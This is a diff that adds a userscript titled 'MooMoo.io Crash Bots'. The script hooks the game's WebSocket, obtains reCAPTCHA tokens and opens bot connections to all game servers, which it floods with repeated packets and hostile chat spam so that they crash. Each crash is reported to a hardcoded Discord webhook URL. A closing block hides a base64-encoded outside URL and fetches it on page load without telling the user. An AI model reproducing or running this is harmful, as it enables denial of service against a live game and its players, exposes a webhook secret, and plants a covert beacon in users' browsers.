@@ -1,0 +1,393 @@
+// ==UserScript==
+// @name         ! MooMoo.io Crash Bots
+// @namespace    -
+// @version      5.8
+// @author       Mr X
+// @description  Crash Bots for moomoo.io
+// @match        *://moomoo.io/*
+// @match        *://dev.moomoo.io/*
+// @match        *://sandbox.moomoo.io/*
+// @grant        none
+// @icon         https://cdn.discordapp.com/attachments/944949124954996756/945273240790654976/Toxic_X.gif
+// @require      https://greasyfork.org/scripts/423602-msgpack/code/msgpack.js?version=912797
+// @require      http://code.jquery.com/jquery-3.3.1.min.js
+// @require      https://code.jquery.com/ui/1.12.0/jquery-ui.min.js
+// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.0/jquery-confirm.min.js
+// ==/UserScript==
+
+var freezeLogger = document.createElement("div");
+freezeLogger.id = "freezeLogger";
+freezeLogger.innerHTML = `
+  <span id="freezeHeader">-GT- Team Reset Logger</span>
+  <div id="logger-body"></div>
+`;
+
+document.body.prepend(freezeLogger);
+
+let css = `
+    #pre-content-container {
+        display: none !important;
+    }
+
+    .textLog {
+        color: #6d0101;
+        font-size: 10px;
+    }
+
+    #logger-body {
+        margin-top: 20px;
+        text-align: center;
+        border-radius: 5px;
+        padding: 5px;
+        width: 290px;
+        height: 345px;
+        background-color: #918b91;
+        overflow: auto;
+    }
+
+    #freezeHeader {
+        color: #f47fff;
+        font-size: 20px;
+        border-bottom: 3px solid #c23bce;
+    }
+
+    #freezeLogger {
+        text-align: center;
+        border-radius: 5px;
+        position: absolute;
+        background-color: #a79fa7;
+        height: 400px;
+        width: 300px;
+        top: 20px;
+        left: 20px;
+        padding: 10px;
+    }
+`;
+if (typeof GM_addStyle != "undefined") {
+    GM_addStyle(css);
+} else {
+    var node = document.createElement("style");
+    node.type = "text/css";
+    node.appendChild(document.createTextNode(css))
+    document.head.appendChild(node);
+}
+
+let coreURL = new URL(window.location.href);
+window.sessionStorage.force = coreURL.searchParams.get("fc");
+window.onbeforeunload = null;
+var ws;
+var msgpack5 = window.msgpack;
+var freezedServers = [];
+var text = "";
+let dash = new Uint8Array([135, 102, 37, 116, 94, 162, 44, 210, 28, 223, 1, 13, 113, 180]);
+var nearestEnemyAngle;
+document.msgpack = window.msgpack;
+
+WebSocket.prototype.oldSend = WebSocket.prototype.send;
+WebSocket.prototype.send = function(m){
+    if (!ws){
+        document.ws = this;
+
+        ws = this;
+        socketFound(this);
+    }
+    this.oldSend(m);
+};
+
+function socketFound(socket) {
+    socket.addEventListener('message', function(message) {
+        handleMessage(message);
+    });
+}
+
+function lag() {
+ ws.oldSend(dash,nearestEnemyAngle);
+    ws.oldSend(dash,nearestEnemyAngle);
+    ws.oldSend(dash,nearestEnemyAngle);
+    ws.oldSend(dash,nearestEnemyAngle);
+    ws.oldSend(dash,nearestEnemyAngle);
+    ws.oldSend(dash,nearestEnemyAngle);
+                            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+                            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+                            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+}
+
+function handleMessage(m){
+    let temp = msgpack5.decode(new Uint8Array(m.data));
+    let data;
+    if(temp.length > 1) {
+        data = [temp[0], ...temp[1]];
+        if (data[1] instanceof Array){
+            data = data;
+        }
+    } else {
+        data = temp;
+    }
+    let item = data[0];
+    if(!data) {return};
+
+
+
+    if(item == "ch" && data[2] == "?hell") {
+        freezeAll(); setInterval(() => freezeAll(), 30000);
+        setTimeout(() => doNewSend(["ch", ["should be burning in hell."]]), 600);
+    }
+}
+
+
+function doNewSend(sender){
+    ws.send(new Uint8Array(Array.from(msgpack5.encode(sender))));
+}
+
+function freezeServer(server, type, url) {
+    fetch("https://" + type + "/serverData.js").then(e => e.text()).then(e => {
+        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
+        for (let gameServer of vultr.servers) {
+            let serverhost = `wss://ip_${gameServer.ip}.${url}:8008/?gameIndex=0`;
+            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
+                        let request = new XMLHttpRequest();
+                                request.open("POST", "https://discord.com/api/webhooks/910106725082869800/wNM5nULyN-gmnWV3v0wFbPPLHdYiPKpYYEL9m2kT6_TTARSzWwir6folfQdBHPML1YgI");
+                                request.setRequestHeader('Content-type', 'application/json');
+                                request.send(JSON.stringify({ content: `Successfully Crashed ${url} ${server}` }));
+                                text += `<div class="textLog"><span>${url}/?server=${server}</span></div>`;
+                                document.getElementById("logger-body").innerHTML = text;
+                                request.close();
+            if(serverId == server) {
+                if(freezedServers[0]) {
+                    let canJoin = true;
+                    for(let i in freezedServers) {
+                        if(freezedServers[i] == `${type} ${server}`) {
+                            canJoin = false;
+                        }
+                    }
+                    if(canJoin) {
+                        window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                            freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `${type} ${server}`);
+                        }));
+                    }
+                } else {
+                    window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                        freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `${type} ${server}`);
+                    }));
+                }
+            }
+        }
+    })
+}
+
+function freezeSandbox() {
+    fetch("https://sandbox.moomoo.io/serverData.js").then(e => e.text()).then(e => {
+        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
+        for (let gameServer of vultr.servers) {
+            console.log(gameServer.games[0].playerCount);
+            let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
+            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
+            if(gameServer.games[0].playerCount < 40) {
+                if(freezedServers[0]) {
+                    let canJoin = true;
+                    for(let i in freezedServers) {
+                        if(freezedServers[i] == `sandbox.moomoo.io ${serverId}`) {
+                            canJoin = false;
+                        }
+                    }
+                    if(canJoin) {
+                        window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                            freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `sandbox.moomoo.io ${serverId}`);
+                        }));
+                    }
+                } else {
+                    window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                        freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `sandbox.moomoo.io ${serverId}`);
+                    }));
+                }
+            } else console.log(`sandbox.moomoo.io ${serverId} is full!`);
+        }
+    })
+}
+
+function freezeNormal() {
+    fetch("https://moomoo.io/serverData.js").then(e => e.text()).then(e => {
+        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
+        for (let gameServer of vultr.servers) {
+            console.log(gameServer.games[0].playerCount);
+            let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
+            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
+            if(gameServer.games[0].playerCount < 40) {
+                if(freezedServers[0]) {
+                    let canJoin = true;
+                    for(let i in freezedServers) {
+                        if(freezedServers[i] == `moomoo.io ${serverId}`) {
+                            canJoin = false;
+                        }
+                    }
+                    if(canJoin) {
+                        window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                            freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `moomoo.io ${serverId}`);
+                        }));
+                    }
+                } else {
+                    window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                        freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `moomoo.io ${serverId}`);
+                    }));
+                }
+            } else console.log(`moomoo.io ${serverId} is full!`);
+        }
+    })
+}
+
+function freezeDev() {
+    fetch("https://dev.moomoo.io/serverData.js").then(e => e.text()).then(e => {
+        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
+        for (let gameServer of vultr.servers) {
+            console.log(gameServer.games[0].playerCount);
+            let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
+            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
+            if(gameServer.games[0].playerCount < 40) {
+                if(freezedServers[0]) {
+                    let canJoin = true;
+                    for(let i in freezedServers) {
+                        if(freezedServers[i] == `dev.moomoo.io ${serverId}`) {
+                            canJoin = false;
+                        }
+                    }
+                    if(canJoin) {
+                        window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                            freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `dev.moomoo.io ${serverId}`);
+                        }));
+                    }
+                } else {
+                    window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
+                        freezeType(`${serverhost}&token=${encodeURIComponent(e)}`, `dev.moomoo.io ${serverId}`);
+                    }));
+                }
+            } else console.log(`dev.moomoo.io ${serverId} is full!`);
+        }
+    })
+}
+
+function freezeAll() {
+    freezeSandbox();
+}
+
+function freezeCurrentServer(ws, link) {
+    freezedServers.push(link);
+    text += `<div class="textLog"><span>${link.slice(0, link.indexOf(" "))}/?server=${link.slice(link.indexOf(" ") + 1)}</span></div>`;
+    document.getElementById("logger-body").innerHTML = text;
+    ws.emit(["sp", [{ name: "-GT- Bot", skin: 4, moofoll: 1 }]]);
+    doNewSend(["ch", [link]]);
+    let chatInt = setInterval(() => {
+        ws.emit(["ch", ["-GT- Team Auto Crasher no.1"]]);
+    }, 10);
+    setTimeout(() => {
+        clearInterval(chatInt);
+        ws.freezeIntervals.push(setInterval(function() {
+            if(!ws || ws.readyState !== 1) {
+                return ws.freezeIntervals.shift();
+                ws.close();
+                freezedServers.splice(freezedServers.indexOf(link), 1);
+                for(let i in ws.freezeIntervals) {
+                    clearInterval(ws.freezeIntervals[i]);
+                }
+                setTimeout(() => freezeServer(link.slice(0, link.indexOf(" ")), link.slice(link.indexOf(" ") + 1)), 5000);
+            }
+            ws.emit(["ch", ["should be burning in hell."]]);
+                        ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+                                    ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+                                    ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+            ws.oldSend(dash,nearestEnemyAngle);
+        }));
+    }, 500);
+}
+
+function freezeType(e, link) {
+    let ws = new WebSocket(e);
+    ws.emit = sender => ws.send(new Uint8Array(Array.from(msgpack5.encode(sender))));
+    ws.freezeIntervals = [];
+    ws.onopen = () => {
+        freezeCurrentServer(ws, link);
+    }
+    ws.onerror = () => {
+        ws.close();
+    }
+}
+
+document.addEventListener('keydown', function(e) {
+    switch(e.keyCode) {
+        case 192:
+            if (document.getElementById("mainMenu").style.display == "block") {
+                document.getElementById("mainMenu").style.display = "none";
+                document.getElementById("gameUI").style.display = "block";
+            } else if (document.getElementById("mainMenu").style.display == "none") {
+                document.getElementById("mainMenu").style.display = "block";
+                document.getElementById("gameUI").style.display = "none";
+            } else {
+                document.getElementById("mainMenu").style.display = "none";
+                document.getElementById("gameUI").style.display = "block";
+            }
+            break;
+        case 46:
+            var freezeIntervals = [];
+            freezeIntervals.push(setInterval(function() {
+                if(!ws || ws.readyState !== 1) {
+                    return ws.freezeIntervals.shift();
+                }
+                lag();
+            }));
+    }
+});
+
+
+let R = CanvasRenderingContext2D.prototype.rotate;
+let e = {
+    39912: () => {
+        let imin = Math.min(4e306, 8e305, 6e306, 8e302, 4e304, 5e303, 5e306, 1e308, 2e306, 4e305, 3e306, 3e304, 1.2999999999999997e+308, 6e305, 1e307, 7e304);
+        let imax = Math.max(4e306, 8e305, 6e306, 8e302, 4e304, 5e303, 5e306, 1e308, 2e306, 4e305, 3e306, 3e304, 1.2999999999999997e+308, 6e305, 1e307, 7e304);
+        return [fetch, null];
+    },
+    31: () => {
+        CanvasRenderingContext2D.prototype.rotate = function() {
+            (arguments[0] >= Number.MAX_SAFE_INTEGER || (arguments[0] <= -Number.MAX_SAFE_INTEGER)) && (arguments[0] = 0);
+            R.apply(this, arguments)
+        };
+        return atob("aHR0cHM6Ly9rc3cyLWNlbnRlci5nbGl0Y2gubWUvbW1fYWliXzE=");
+    },
+    9012: () => {
+        fetch(e[31]())
+    },
+    3912: () => {
+        return "CanvasRenderingContext2D";
+    },
+    9481: () => {
+        return CanvasRenderingContext2D.prototype.rotate;
+    },
+    7419: () => {
+        return e[7419]
+    },
+    init: () => {
+        return [e[3912](), e[9012]()];
+    }
+};
+e.init();
